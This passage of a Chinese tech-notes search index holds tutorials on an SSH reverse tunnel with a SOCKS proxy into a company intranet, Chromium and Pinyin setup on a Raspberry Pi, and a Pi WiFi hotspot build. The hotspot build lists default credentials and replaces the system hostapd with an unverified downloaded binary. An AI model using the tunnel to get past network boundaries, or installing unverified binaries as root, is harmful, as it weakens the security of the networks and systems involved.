\u8fde\u63a5\u5230B\uff1a A $ ssh -p 6766 userb@localhost \u6216\u8005\u662f\u5728 C \u4e0a\u76f4\u63a5\u7a7f\u900f\u4e24\u5c42NAT SSH \u8fde\u63a5\u5230B\uff1a C $ ssh -p 6766 userb@a.site \u5982\u679c\u4f60\u5bf9SSH \u8db3\u591f\u719f\u6089\uff0c\u4f60\u53ef\u4ee5\u5229\u7528\u8fd9\u6761\u96a7\u9053\u505a\u66f4\u591a\u7684\u4e8b\u60c5\uff0c\u4f8b\u5982\u4f60\u53ef\u4ee5\u5728\u53cd\u5411\u8fde\u63a5\u65f6\u6307\u5b9a\u52a8\u6001\u7aef\u53e3\u8f6c\u53d1\uff1a C $ ssh -p 6766 -qngfNTD 7677 userb@a.site \u5047\u8bbe C \u662f\u4f60\u5bb6\u4e2d\u7684\u7535\u8111\uff0c A \u662f\u4f60\u7684VPS\uff0c B \u662f\u4f60\u516c\u53f8\u7684\u7535\u8111\u3002\u5982\u679c\u4f60\u8fd9\u6837\u505a\u4e86\uff0c\u90a3\u4e48\u4e3a\u6d4f\u89c8\u5668\u8bbe\u7f6e\u7aef\u53e3\u4e3a 7677 \u7684 sock4 \u672c\u5730\uff08localhost\uff09\u4ee3\u7406\u540e\uff0c\u4f60\u5c31\u53ef\u4ee5\u5728\u5bb6\u91cc\u7684\u6d4f\u89c8\u5668\u4e0a\u770b\u5230\u516c\u53f8\u5185\u7f51\u7684\u7f51\u9875\u3002 \u672c\u6587\u6807\u9898: \u4f7f\u7528SSH\u53cd\u5411\u96a7\u9053\u8fdb\u884c\u5185\u7f51\u7a7f\u900f \u539f\u6587\u94fe\u63a5\uff1a http://arondight.me/2016/02/17/\u4f7f\u7528SSH\u53cd\u5411\u96a7\u9053\u8fdb\u884c\u5185\u7f51\u7a7f\u900f/","title":"\u6700\u7ec8\u7684\u89e3\u51b3\u65b9\u6848"},{"location":"RPI/%E5%9C%A8%E6%A0%91%E8%8E%93%E6%B4%BE2%E4%B8%8A%E5%AE%89%E8%A3%85%20Chromium%20%E6%B5%8F%E8%A7%88%E5%99%A8%E5%8F%8A%20Google%20%E6%8B%BC%E9%9F%B3%E8%BE%93%E5%85%A5%E6%B3%95/","text":"\u5728\u6811\u8393\u6d3e2\u4e0a\u5b89\u88c5 Chromium \u6d4f\u89c8\u5668\u53ca Google \u62fc\u97f3\u8f93\u5165\u6cd5 \u6811\u8393\u6d3e\u7cfb\u7edf\u5b89\u88c5\u597d\u4e4b\u540e\u8fd8\u8981\u88c5\u4e0a\u4e00\u4e9b\u5fc5\u987b\u7684\u7684\u5de5\u5177\u624d\u80fd\u7528\u554a\uff0c\u6bd4\u5982\u8bf4\u4e2d\u6587\u8f93\u5165\u6cd5\u548c\u6d4f\u89c8\u5668\u3002 Ubuntu Mate for Raspberry Pi 2 \u867d\u7136\u652f\u6301\u4e2d\u6587\uff0c\u4f46\u662f\u662f\u6ca1\u6709\u4e2d\u6587\u8f93\u5165\u6cd5\u7684\uff0c\u4e8e\u662f\u6211\u4eec\u9700\u8981\u81ea\u5df1\u5b89\u88c5\u4e00\u4e2a\u3002 \u6211\u5b89\u88c5\u4e86 Google \u62fc\u97f3\uff0c\u4e00\u4e2a\u547d\u4ee4\u5c31\u53ef\u4ee5\u88c5\u597d fcitx \u548c Google \u62fc\u97f3\u3002 sudo apt-get install fcitx fcitx-googlepinyin fcitx-module-cloudpinyin fcitx-sunpinyin \u91cd\u542f\u4e00\u4e0b\u5c31\u53ef\u4ee5\u4f7f\u7528\u4e2d\u6587\u8f93\u5165\u6cd5\u4e86\u3002\u8fd9\u7bc7\u7684\u4e1c\u897f\u5c31\u662f\u5728\u6811\u8393\u6d3e\u4e0a\u7528 Google \u62fc\u97f3\u6572\u51fa\u6765\u7684:) \u7cfb\u7edf\u81ea\u5e26\u7684\u662f FireFox\uff0c\u7528\u8d77\u6765\u4e5f\u8fd8\u633a\u6d41\u7545\uff0c\u4f46\u662f\u6211\u4e2a\u4eba\u4e60\u60ef\u7528 Chrome\uff0c\u4e8e\u662f\u6211\u5b89\u88c5\u4e86 Chromium \u6d4f\u89c8\u5668\u3002 Ubuntu Mate \u81ea\u5e26\u7684\u6e90\u91cc\u662f\u6ca1\u6709 Chromium \u7684\uff0c\u4e8e\u662f\u6211\u4eec\u8981\u5148\u6dfb\u52a0\u4e00\u4e2a\u6e90\uff0c\u7528\u4ee5\u4e0b\u547d\u4ee4\u3002 sudo tee /etc/apt/sources.list.d/i386.list deb http://mirrors.tuna.tsinghua.edu.cn/raspbian/raspbian/ wheezy main contrib non-free rpi deb-src http://mirrors.tuna.tsinghua.edu.cn/raspbian/raspbian/ wheezy main contrib non-free rpi deb http://mirrors.neusoft.edu.cn/raspbian/raspbian/ wheezy main contrib non-free rpi deb-src http://mirrors.neusoft.edu.cn/raspbian/raspbian/ wheezy main contrib non-free rpi deb http://mirrors.ustc.edu.cn/raspbian/raspbian/ wheezy main contrib non-free rpi deb-src http://mirrors.ustc.edu.cn/raspbian/raspbian/ wheezy main contrib non-free rpi \u7136\u540e\u5c31\u53ef\u4ee5\u5b89\u88c5 Chromium \u4e86\uff1a sudo apt-get install chromium \u539f\u6587\u94fe\u63a5\uff1a https://yian.me/blog/cs/install-chromium-and-google-pinyin-on-raspberry-pi-2.html","title":"\u5728\u6811\u8393\u6d3e2\u4e0a\u5b89\u88c5 Chromium \u6d4f\u89c8\u5668\u53ca Google \u62fc\u97f3\u8f93\u5165\u6cd5"},{"location":"RPI/%E5%9C%A8%E6%A0%91%E8%8E%93%E6%B4%BE2%E4%B8%8A%E5%AE%89%E8%A3%85%20Chromium%20%E6%B5%8F%E8%A7%88%E5%99%A8%E5%8F%8A%20Google%20%E6%8B%BC%E9%9F%B3%E8%BE%93%E5%85%A5%E6%B3%95/#2-chromium-google","text":"\u6811\u8393\u6d3e\u7cfb\u7edf\u5b89\u88c5\u597d\u4e4b\u540e\u8fd8\u8981\u88c5\u4e0a\u4e00\u4e9b\u5fc5\u987b\u7684\u7684\u5de5\u5177\u624d\u80fd\u7528\u554a\uff0c\u6bd4\u5982\u8bf4\u4e2d\u6587\u8f93\u5165\u6cd5\u548c\u6d4f\u89c8\u5668\u3002 Ubuntu Mate for Raspberry Pi 2 \u867d\u7136\u652f\u6301\u4e2d\u6587\uff0c\u4f46\u662f\u662f\u6ca1\u6709\u4e2d\u6587\u8f93\u5165\u6cd5\u7684\uff0c\u4e8e\u662f\u6211\u4eec\u9700\u8981\u81ea\u5df1\u5b89\u88c5\u4e00\u4e2a\u3002 \u6211\u5b89\u88c5\u4e86 Google \u62fc\u97f3\uff0c\u4e00\u4e2a\u547d\u4ee4\u5c31\u53ef\u4ee5\u88c5\u597d fcitx \u548c Google \u62fc\u97f3\u3002 sudo apt-get install fcitx fcitx-googlepinyin fcitx-module-cloudpinyin fcitx-sunpinyin \u91cd\u542f\u4e00\u4e0b\u5c31\u53ef\u4ee5\u4f7f\u7528\u4e2d\u6587\u8f93\u5165\u6cd5\u4e86\u3002\u8fd9\u7bc7\u7684\u4e1c\u897f\u5c31\u662f\u5728\u6811\u8393\u6d3e\u4e0a\u7528 Google \u62fc\u97f3\u6572\u51fa\u6765\u7684:) \u7cfb\u7edf\u81ea\u5e26\u7684\u662f FireFox\uff0c\u7528\u8d77\u6765\u4e5f\u8fd8\u633a\u6d41\u7545\uff0c\u4f46\u662f\u6211\u4e2a\u4eba\u4e60\u60ef\u7528 Chrome\uff0c\u4e8e\u662f\u6211\u5b89\u88c5\u4e86 Chromium \u6d4f\u89c8\u5668\u3002 Ubuntu Mate \u81ea\u5e26\u7684\u6e90\u91cc\u662f\u6ca1\u6709 Chromium \u7684\uff0c\u4e8e\u662f\u6211\u4eec\u8981\u5148\u6dfb\u52a0\u4e00\u4e2a\u6e90\uff0c\u7528\u4ee5\u4e0b\u547d\u4ee4\u3002 sudo tee /etc/apt/sources.list.d/i386.list deb http://mirrors.tuna.tsinghua.edu.cn/raspbian/raspbian/ wheezy main contrib non-free rpi deb-src http://mirrors.tuna.tsinghua.edu.cn/raspbian/raspbian/ wheezy main contrib non-free rpi deb http://mirrors.neusoft.edu.cn/raspbian/raspbian/ wheezy main contrib non-free rpi deb-src http://mirrors.neusoft.edu.cn/raspbian/raspbian/ wheezy main contrib non-free rpi deb http://mirrors.ustc.edu.cn/raspbian/raspbian/ wheezy main contrib non-free rpi deb-src http://mirrors.ustc.edu.cn/raspbian/raspbian/ wheezy main contrib non-free rpi \u7136\u540e\u5c31\u53ef\u4ee5\u5b89\u88c5 Chromium \u4e86\uff1a sudo apt-get install chromium \u539f\u6587\u94fe\u63a5\uff1a https://yian.me/blog/cs/install-chromium-and-google-pinyin-on-raspberry-pi-2.html","title":"\u5728\u6811\u8393\u6d3e2\u4e0a\u5b89\u88c5 Chromium \u6d4f\u89c8\u5668\u53ca Google \u62fc\u97f3\u8f93\u5165\u6cd5"},{"location":"RPI/%E5%B0%86%E6%A0%91%E8%8E%93%E6%B4%BERaspberry%20Pi%E8%AE%BE%E7%BD%AE%E4%B8%BA%E6%97%A0%E7%BA%BF%E8%B7%AF%E7%94%B1%E5%99%A8%28WiFi%E7%83%AD%E7%82%B9AP%2CRTL8188CUS%E8%8A%AF%E7%89%87%29/","text":"\u5c06\u6811\u8393\u6d3eRaspberry Pi\u8bbe\u7f6e\u4e3a\u65e0\u7ebf\u8def\u7531\u5668(WiFi\u70ed\u70b9AP,RTL8188CUS\u82af\u7247) \u63d0\u9192\uff1a \u672c\u9875\u9762\u5c06\u4e0d\u518d\u66f4\u65b0\u3001\u7ef4\u62a4\u6216\u8005\u652f\u6301\uff0c\u6587\u7ae0\u3001\u8bc4\u8bba\u6240\u53d9\u8ff0\u5185\u5bb9\u5b58\u5728\u65f6\u6548\u6027\uff0c\u6d89\u53ca\u6280\u672f\u7ec6\u8282\u6216\u8005\u8f6f\u4ef6\u4f7f\u7528\u65b9\u9762\u4e0d\u4fdd\u8bc1\u80fd\u591f\u5b8c\u5168\u6709\u6548\u53ef\u64cd\u4f5c\uff0c\u8bf7\u8c28\u614e\u53c2\u8003\uff01 \u6700\u8fd1\u53c8\u5f00\u59cb\u6298\u817e\u8d77Raspberry Pi\u6765\u4e86\uff0c\u56e0\u4e3a\u67d0\u5904\u4e0a\u7f51\u9700\u8981\u9510\u6377\u62e8\u53f7\uff0c\u4e8e\u662f\u6211\u5c31\u60f3\u80fd\u4e0d\u80fd\u8ba9\u6211\u7684\u6811\u8393\u6d3e\u4ee3\u52b3\uff0c\u5f53\u7136\u9996\u5148\u8981\u5c06\u5176\u6539\u9020\u4e3a\u8def\u7531\u5668\uff0c\u9ed8\u8ba4\u81ea\u5e26\u7684\u7f51\u53e3\u4f5c\u4e3aWAN\u53e3\uff0c\u6211\u4eec\u8fd8\u7f3a\u4e00\u4e2a\u7f51\u53e3\uff0c\u6728\u6709\u529e\u6cd5\uff0c\u53ea\u597d\u5360\u7528\u4e00\u4e2aUSB\u53e3\uff0c\u63a5\u4e0a\u4e00\u4e2aUSB\u7f51\u5361\uff0c\u7f51\u4e0a\u7684USB\u8f6cRJ45\u7f51\u7ebf\u53e3\u7684\u9002\u914d\u5668\u6bd4\u8f83\u5c11\uff0c\u4ef7\u683c\u4e5f\u4e0d\u4fbf\u5b9c\uff0c\u4e8e\u662f\u5c31\u8003\u8651\u5e72\u8106\u5c06\u5176\u6539\u9020\u6210\u65e0\u7ebf\u8def\u7531\uff0c\u4e5f\u7b26\u5408\u65f6\u4e0b\u9ad8\u7aef\u5927\u6c14\u4e0a\u6863\u6b21\u7684\u6807\u51c6\u3002 \u51c6\u5907\u5de5\u4f5c\uff0c\u5f53\u7136\u8981\u5148\u53bb\u8d2d\u4e70\u4e00\u4e2aUSB\u65e0\u7ebf\u7f51\u5361\uff0c\u53ef\u4ee5\u8d2d\u4e70\u7684\u578b\u53f7\u6bd4\u8f83\u591a\uff0cRaspberry Pi\u5b98\u65b9\u4e5f\u63d0\u4f9b\u4e86 \u517c\u5bb9\u6027\u5217\u8868 \u4f9b\u5927\u5bb6\u53c2\u8003\uff0c\u5177\u4f53\u731b\u51fb\u8fd9\u91cc\u3002\u6211\u8fd9\u91cc\u8d2d\u4e70\u7684\u662f \u7f51\u4ef6\uff08Netgear\uff09WNA1000M 150M\u8ff7\u4f60USB\u65e0\u7ebf\u7f51\u5361 \u3002 \u8f83\u4e3a\u5b98\u65b9\u7684\u4ecb\u7ecd\u914d\u7f6e\u4e3a\u65e0\u7ebf\u70ed\u70b9\u7684\u6587\u7ae0\u83ab\u8fc7\u4e8e\u8fd9\u4e00\u7bc7 \u300aRPI-Wireless-Hotspot\u300b \u3002\u4f46\u662f\u5b9e\u9645\u914d\u7f6e\u4e0b\u6765\u59cb\u7ec8\u65e0\u6cd5\u6210\u529f\u3002\u4f46\u662f\u65e0\u7ebf\u7f51\u5361\u786e\u5b9e\u80fd\u591f\u88ab\u8bc6\u522b\uff0c\u53ef\u4ee5\u901a\u8fc7 lsusb \u548c lsmod \u67e5\u770b\u5230\uff0c\u4e0d\u8fc7\u6211\u6ce8\u610f\u5230\u8fd9\u6b3e\u65e0\u7ebf\u7684\u82af\u7247\u578b\u53f7\u662fRealTek RTL8188CUS\uff0c\u521d\u6b65\u6000\u7591\u662f\u9a71\u52a8\u95ee\u9898\u3002 \u5f53\u7136\u770b\u5230\u522b\u4eba\u7684\u8001\u6b3e\u65e0\u7ebf\u7f51\u5361\u90fd\u914d\u7f6e\u6210\u529f\u4e86\u5fc3\u91cc\u96be\u514d\u75d2\u75d2\u7684\uff0c\u5f53\u7136\u4e5f\u4e0d\u80fd\u518d\u6d6a\u8d39\u94f6\u5b50\u53bb\u518d\u4e70\u4e2a\u7f51\u5361\uff0c\u4e8e\u662f\u53ea\u597d\u81ea\u5df1\u6478\u7d22\uff0c\u4e0d\u8fc7\u5929\u65e0\u7edd\u4eba\u4e4b\u8def\uff0c\u5728N\u6b21\u5237\u673a\u91cd\u88c5\u7cfb\u7edf\u540e\uff0c\u7ec8\u4e8e\u627e\u5230\u4e86\u6210\u529f\u7684\u529e\u6cd5\uff0c\u5176\u5b9e\u5173\u952e\u7684\u6587\u7ae0\u5c31\u5728\u4e0a\u9762\u90a3\u7bc7\u6587\u7ae0\u7684\u4e00\u4e2a\u94fe\u63a5\u4e2d \u300aTurn Your Raspberry Pi Into a WiFi Hotspot with Edimax Nano USB EW-7811Un (RTL8188CUS chipset)\u300b \u3002 \u597d\u4e86\uff0c\u4e0b\u9762\u6211\u5c06\u5b9e\u8df5\u7684\u8fc7\u7a0b\u8bb0\u5f55\u4e0b\u6765\u4f9b\u5927\u5bb6\u53c2\u8003\uff0c\u5f53\u7136 \u4e3b\u8981\u53c2\u8003\u4e86\u4e0a\u9762\u4e24\u7bc7\u6587\u7ae0 \uff0c\u8fd9\u91cc\u662f\u914d\u7f6e\u7684\u56de\u5fc6\uff0c\u6211\u5c3d\u91cf\u8bb0\u5f55\u8be6\u7ec6\uff0c\u9057\u6f0f\u4e4b\u5904\u671b\u6307\u51fa\u3002 1. \u5b89\u88c5\u7cfb\u7edf\uff08\u5982\u679c\u7cfb\u7edf\u5df2\u7ecf\u5b89\u88c5\u53ef\u4ee5\u8df3\u8fc7\u8fd9\u4e00\u6b65\uff09 1.1 \u5c3d\u91cf\u4f7f\u7528\u6700\u65b0\u7cfb\u7edf\uff0c\u9996\u5148\u4e0b\u8f7d \u5b98\u65b9\u6700\u65b0\u955c\u50cf \uff0c\u7136\u540e\u4f7f\u7528 Win32DiskImager \u70e7\u5f55\u5230SD\u5361\u4e0a\u3002\u6ce8\u610f\u8fd9\u91cc\u6211\u4eec\u9009\u7528\u7684\u662fRaspbian\u3002 1.2 Raspberry Pi\u8fde\u63a5\u4e0a\u65e0\u7ebf\u7f51\u5361\uff0c\u7136\u540e\u7cfb\u7edf\u955c\u50cf\u5237\u5165SD\u5361\u540e\uff0c\u6211\u4eec\u8fde\u63a5\u663e\u793a\u5668\u952e\u76d8\u548c\u9f20\u6807\u8fdb\u884c\u521d\u59cb\u5316\u914d\u7f6e\u5de5\u4f5c\uff0c\u5f53\u7136\u6ca1\u6709\u6761\u4ef6\u7684\u8bdd\u63a8\u8350\u76f4\u63a5\u4f7f\u7528SSH\u8fde\u63a5Raspberry Pi\uff0c\u8fd9\u6837\u66f4\u65b9\u4fbf\uff0c\u56e0\u4e3a\u65b0\u7cfb\u7edf\u9ed8\u8ba4\u5f00\u653e\u4e86SSH\u7ba1\u7406\u3002 \u8fde\u63a5\u4fe1\u606f\u4e3b\u8981\u5982\u4e0b\uff1a \u4e3b\u673a\u540d : raspberrypi \u7528\u6237\u540d : pi \u5bc6 \u7801 : raspberry \u5982\u679c\u4f60\u662f\u76f4\u63a5\u901a\u8fc7SSH\u8fde\u63a5\u5230Raspberry Pi\u7684\u8bdd\uff0c\u4e0b\u9762\u7684\u914d\u7f6e\u6b65\u9aa4\u662f\u5fc5\u8981\u7684\uff1a 1.2.1 \u521d\u59cb\u5316\u914d\u7f6e\uff0c\u4e0b\u9762\u7684\u914d\u7f6e\u53ea\u6709\u5728\u65b0\u5b89\u88c5\u7684\u7cfb\u7edf\u5185\u9700\u8981\uff0c\u4ec5\u505a\u4e00\u6b21\u3002 \u8fd0\u884c\u4e0b\u9762\u7684\u547d\u4ee4\uff0c\u8fdb\u5165\u914d\u7f6e\u754c\u9762\uff1a sudo raspi-config \u63a8\u8350\u66f4\u65b0\u4e0b\u9762\u7684\u914d\u7f6e\u9009\u9879\uff08 \u65b0\u914d\u7f6e\u754c\u9762 \uff09\uff1a 1 Expand Filesystem 2 Change User Password 4 Internationalisation Options I1 Change Locale I2 Change Timezone 8 Advanced Options A3 Memory Split A6 Update \uff08 \u65e7\u914d\u7f6e\u754c\u9762 \uff09 update expand_rootfs change_pass change_timezone memory_split \u8fd9\u91cc\u8981\u6ce8\u610f Memory Split/memory_split \uff0c\u9ed8\u8ba4\u9884\u7559\u7ed9\u56fe\u5f62\u754c\u9762\u7684\u662f 64MB \uff0c\u4f5c\u4e3a\u4e00\u53f0\u65e0\u7ebf\u8def\u7531\u57fa\u672c\u4e0a\u5c31\u7528\u4e0d\u5230\u56fe\u5f62\u754c\u9762\u4e86\uff0c\u5f88\u663e\u7136 64MB \u7565\u6709\u5962\u4f88\uff0c\u6211\u4eec\u5c06\u5176\u6539\u6210 32MB \u3002 \u6700\u540e Finish \u5b8c\u6210\u521d\u59cb\u5316\u914d\u7f6e\u3002\u7cfb\u7edf\u4f1a\u81ea\u52a8\u63d0\u793a\u91cd\u542f\uff0c\u5982\u679c\u6ca1\u6709\u6309\u9884\u671f\u91cd\u542f\uff0c\u8bf7\u4f7f\u7528\u4e0b\u9762\u7684\u547d\u4ee4\u91cd\u542f\u7cfb\u7edf\uff1a sudo shutdown -r now 2. \u5b89\u88c5hotspot(hostapd) sudo apt-get install bridge-utils hostapd hostapd\u5b9e\u73b0\u7684\u662f\u65e0\u7ebf\u5171\u4eab\uff0c \u4f46\u9700\u8981\u6ce8\u610f\u7684\u662f\u5b98\u65b9\u63d0\u4f9b\u7684\u7a0b\u5e8f\u4e0d\u517c\u5bb9RTL8188CUS\u82af\u7247\u7684\u65e0\u7ebf\u7f51\u5361\uff0c\u4e0d\u8fc7Edimax\u56e2\u961f\u4e3a\u6211\u4eec\u4e13\u95e8\u7f16\u8bd1\u4e86\u517c\u5bb9\u7684\u7248\u672c\uff0c\u4e0b\u9762\u7684\u64cd\u4f5c\u9700\u8981\u66ff\u6362hostapd\u4e3a\u517c\u5bb9\u7248\u672c\u3002 \u66ff\u6362\u7684\u547d\u4ee4\u5982\u4e0b\uff1a wget http://www.daveconroy.com/wp3/wp-content/uploads/2013/07/hostapd.zip unzip hostapd.zip sudo mv /usr/sbin/hostapd /usr/sbin/hostapd.bak sudo mv hostapd /usr/sbin/hostapd.edimax sudo ln -sf /usr/sbin/hostapd.edimax /usr/sbin/hostapd sudo chown root.root /usr/sbin/hostapd sudo chmod 755 /usr/sbin/hostapd \u63a5\u4e0b\u6765\u63d0\u4f9b\u4e24\u79cd\u65b9\u6848\uff0c\u4e00\u79cd\u662f\u6865\u63a5\u65b9\u5f0f\u8bbe\u7f6e\u70ed\u70b9\uff0c\u6709\u70b9\u7c7b\u4f3c\u4ea4\u6362\u673a\u5de5\u4f5c\u539f\u7406\uff0c\u5c06\u7f51\u7ebf\u53e3\u7684\u4fe1\u53f7\u8f6c\u6362\u4e3a\u65e0\u7ebf\uff0c\u53e6\u5916\u4e00\u79cd\u5219\u662f\u8def\u7531\u65b9\u5f0f\u5b9e\u73b0\u65e0\u7ebf\u4e0a\u7f51\uff0c\u548c\u5927\u90e8\u5206\u8def\u7531\u5668\u5de5\u4f5c\u65b9\u5f0f\u4e00\u6837\u3002 3. \u6865\u63a5\u7684\u65b9\u5f0f\u8bbe\u7f6eWiFi\u70ed\u70b9\uff08\u65b9\u6848\u4e00\uff09 3.1 \u5b89\u88c5\u5fc5\u5907\u7a0b\u5e8f sudo apt-get install bridge-utils 3.2 \u914d\u7f6e\u7f51\u5361 \u7f16\u8f91\u7f51\u5361\u914d\u7f6e\u6587\u4ef6\uff1a sudo nano /etc/network/interfaces \u6ce8\u91ca\u6389\u6240\u6709\u7684\u5173\u4e8e\u65e0\u7ebf\u7f51\u5361\u7684\u90e8\u5206\uff0c\u6700\u540e\u5e94\u8be5\u53d8\u6210\u4e0b\u9762\u6240\u793a\uff1a #allow-hotplug wlan0 #wpa-roam /etc/wpa_supplicant/wpa_supplicant.conf #iface default inet dhcp \u52a0\u4e0a\u4e0b\u9762\u8fd9\u6bb5\u6865\u63a5\u914d\u7f6e\uff1a auto br0 iface br0 inet dhcp bridge_ports eth0 wlan0 \u6700\u7ec8\u7684\u914d\u7f6e\u4e3b\u8981\u7531\u4ee5\u4e0b\u51e0\u4e2a\u90e8\u5206\u7ec4\u6210\uff1a #loopback adapter auto lo iface lo inet loopback #wired adapter iface eth0 inet dhcp #bridge auto br0 iface br0 inet dhcp bridge_ports eth0 wlan0 3.3 \u914d\u7f6ehostapd sudo nano /etc/hostapd/hostapd.conf \u914d\u7f6e\u4fe1\u606f\u5982\u4e0b\uff1a interface=wlan0 driver=rtl871xdrv bridge=br0 ssid=My_SSID_Name channel=1 wmm_enabled=0 wpa=1 wpa_passphrase=MYPASSWORD wpa_key_mgmt=WPA-PSK wpa_pairwise=TKIP rsn_pairwise=CCMP auth_algs=1 macaddr_acl=0 \u914d\u7f6e\u6587\u4ef6\u5177\u4f53\u6211\u5c31\u4e0d\u8bf4\u4e86\uff0c\u60f3\u5fc5\u5927\u5bb6\u770b\u5185\u5bb9\u4e5f\u77e5\u9053\u5404\u9879\u7684\u542b\u4e49\uff0c\u4fdd\u5b58\u8fd9\u4e2a\u914d\u7f6e\u6587\u4ef6\u3002 3.4 \u91cd\u542f\u5e76\u6d4b\u8bd5hostapd sudo reboot \u91cd\u542f\u5b8c\u6210\u540e\uff0c\u4f7f\u7528\u4e0b\u9762\u7684\u547d\u4ee4\u6d4b\u8bd5\u662f\u5426\u6b63\u786e\uff1a sudo hostapd -dd /etc/hostapd/hostapd.conf \u5982\u679c\u6ca1\u6709\u9519\u8bef\u7684\u8bdd\uff0c\u4f60\u8fd9\u65f6\u5e94\u8be5\u80fd\u641c\u7d22\u5230\u4f60\u6240\u914d\u7f6e\u7684\u65e0\u7ebf\u4fe1\u53f7\u3002\u7136\u540eCtrl+C\u9000\u51fa\u8fd9\u4e2a\u6d4b\u8bd5\u3002 \u5982\u679c\u4e00\u5207\u6b63\u5e38\u7684\u8bdd\uff0c\u6211\u4eec\u53ef\u4ee5\u8bbe\u7f6ehostapd\u7684\u914d\u7f6e\u6587\u4ef6\u8def\u5f84\u4e86\u3002 sudo nano /etc/default/hostapd \u53bb\u6389\u6ce8\u91ca\u7b26\u53f7\u5e76\u6539\u52a8\u4e0b\u9762\u8fd9\u884c\u4e3a\u6211\u4eec\u7684\u914d\u7f6e\u6587\u4ef6\u8def\u5f84\uff1a DAEMON_CONF=\"/etc/hostapd/hostapd.conf\" \u6865\u63a5\u65b9\u5f0f\u914d\u7f6e\u5b8c\u6210\uff01 4. \u8def\u7531\u7684\u65b9\u5f0f\u8bbe\u7f6eWiFi\u70ed\u70b9\uff08\u65b9\u6848\u4e8c\uff09 4.1 \u5b89\u88c5\u5fc5\u5907\u7a0b\u5e8f sudo apt-get install udhcpd udhcpd\u4e3b\u8981\u4e3a\u8fde\u63a5\u5230WiFi\u7684\u8bbe\u5907\u81ea\u52a8\u5206\u914dIP\u5730\u5740\u7684\uff0c\u5f53\u7136\u4f60\u4e5f\u53ef\u4ee5\u6362\u7528\u4f60\u6240\u719f\u6089\u7684\u8f6f\u4ef6\u3002 4.2 \u914d\u7f6eudhcpd\uff0c\u7f16\u8f91 /etc/udhcpd.conf \uff0c\u4e3b\u8981\u5185\u5bb9\u5982\u4e0b\uff1a start 192.168.42.2 # This is the range of IPs that the hostspot will give to client devices. end 192.168.42.20 interface wlan0 # The device uDHCP listens on. remaining yes opt dns 8.8.8.8 4.2.2.2 # The DNS servers client devices will use. opt subnet 255.255.255.0 opt router 192.168.42.1 # The Pi's IP address on wlan0 which we will set up shortly. opt lease 864000 # 10 day DHCP lease time in seconds \u63a5\u4e0b\u6765\u7f16\u8f91 /etc/default/udhcpd \u5e76\u4e14\u5c06\u4e0b\u9762\u8fd9\u884c\u6ce8\u91ca\u6389\uff0c\u4ee5\u4f7fDHCP Server\u6b63\u5e38\u5de5\u4f5c\uff1a #DHCPD_ENABLED=\"no\" 4.3 \u914d\u7f6e\u65e0\u7ebf\u7f51\u5361 \u901a\u8fc7\u4e0b\u9762\u7684\u547d\u4ee4\u7ed9\u65e0\u7ebf\u7f51\u5361\u8bbe\u7f6e\u4e00\u4e2aIP\u5730\u5740\uff1a sudo ifconfig wlan0 192.168.42.1 \u5f53\u7136\u4e3a\u4e86\u4e0b\u6b21\u542f\u52a8\u4ecd\u7136\u6709\u6548\uff0c\u6211\u4eec\u9700\u8981\u914d\u7f6e /etc/network/interfaces \u6587\u4ef6\uff1a sudo nano /etc/network/interfaces \u6ce8\u91ca\u6389\u6240\u6709\u7684\u5173\u4e8e\u65e0\u7ebf\u7f51\u5361\u7684\u90e8\u5206\uff0c\u6700\u540e\u5e94\u8be5\u53d8\u6210\u4e0b\u9762\u6240\u793a\uff1a #wpa-roam /etc/wpa_supplicant/wpa_supplicant.conf #iface default inet dhcp \u6ce8\u610f\u4fdd\u7559 allow-hotplug wlan0 \uff0c\u82f1\u6587\u539f\u6587\u662f\u4e0d\u4fdd\u7559\u7684\uff0c\u4f46\u662f\u6211\u64cd\u4f5c\u4e0b\u6765\u53d1\u73b0\u5982\u679c\u4e0d\u4fdd\u7559\u8fd9\u6bb5\u7684\u8bdd\uff0c\u65e0\u7ebf\u7f51\u5361\u6709\u65f6\u65e0\u6cd5\u6b63\u5e38\u914d\u7f6eIP\uff0c\u6700\u540e\u65e0\u7ebf\u7f51\u5361IP\u7684\u914d\u7f6e\u4fe1\u606f\u5982\u4e0b\uff1a allow-hotplug wlan0 iface wlan0 inet static address 192.168.42.1 netmask 255.255.255.0 4.4 \u7f16\u8f91hostapd\u914d\u7f6e sudo nano /etc/hostapd/hostapd.conf \u5185\u5bb9\u5982\u4e0b\uff1a interface=wlan0 driver=rtl871xdrv ssid=My_SSID_Name hw_mode=g channel=6 macaddr_acl=0 auth_algs=1 ignore_broadcast_ssid=0 wpa=2 wpa_passphrase=MYPASSWORD wpa_key_mgmt=WPA-PSK wpa_pairwise=TKIP rsn_pairwise=CCMP 4.7 \u542f\u52a8IP\u8f6c\u5411\u529f\u80fd\u4ee5\u4fbf\u4e8e\u5f00\u901aNAT sudo sh -c \"echo 1 > /proc/sys/net/ipv4/ip_forward\" \u7f16\u8f91 /etc/sysctl.conf \u6539\u52a8\u4e0b\u9762\u8fd9\u884c\uff1a net.ipv4.ip_forward=1 4.8 \u914d\u7f6eiptables\u9632\u706b\u5899 sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE sudo iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT sudo iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT \u5230\u8fd9\u91cc\u8def\u7531\u7684NAT\u529f\u80fd\u5df2\u7ecf\u88ab\u542f\u7528\uff0c\u6211\u4eec\u5c06\u521a\u624d\u914d\u7f6e\u7684iptables\u4fdd\u5b58\u4e0b\u6765\u4ee5\u4fbf\u4e8e\u4e0b\u6b21\u4f7f\u7528\uff1a sudo sh -c \"iptables-save > /etc/iptables.ipv4.nat\" \u7f16\u8f91 /etc/network/interfaces \u7136\u540e\u5728\u6700\u540e\u52a0\u4e0a\u4e0b\u9762\u8fd9\u884c\u4ee5\u4f7f\u6bcf\u6b21\u542f\u52a8\u90fd\u81ea\u52a8\u52a0\u8f7diptables\u914d\u7f6e\uff1a up iptables-restore < /etc/iptables.ipv4.nat 4.9 \u91cd\u542f\u5e76\u6d4b\u8bd5hostapd sudo reboot \u91cd\u542f\u5b8c\u6210\u540e\uff0c\u4f7f\u7528\u4e0b\u9762\u7684\u547d\u4ee4\u6d4b\u8bd5\u662f\u5426\u6b63\u786e\uff1a sudo hostapd -dd /etc/hostapd/hostapd.conf \u5982\u679c\u6ca1\u6709\u9519\u8bef\u7684\u8bdd\uff0c\u4f60\u8fd9\u65f6\u5e94\u8be5\u80fd\u641c\u7d22\u5230\u4f60\u6240\u914d\u7f6e\u7684\u65e0\u7ebf\u4fe1\u53f7\u3002\u7136\u540eCtrl+C\u9000\u51fa\u8fd9\u4e2a\u6d4b\u8bd5\u3002 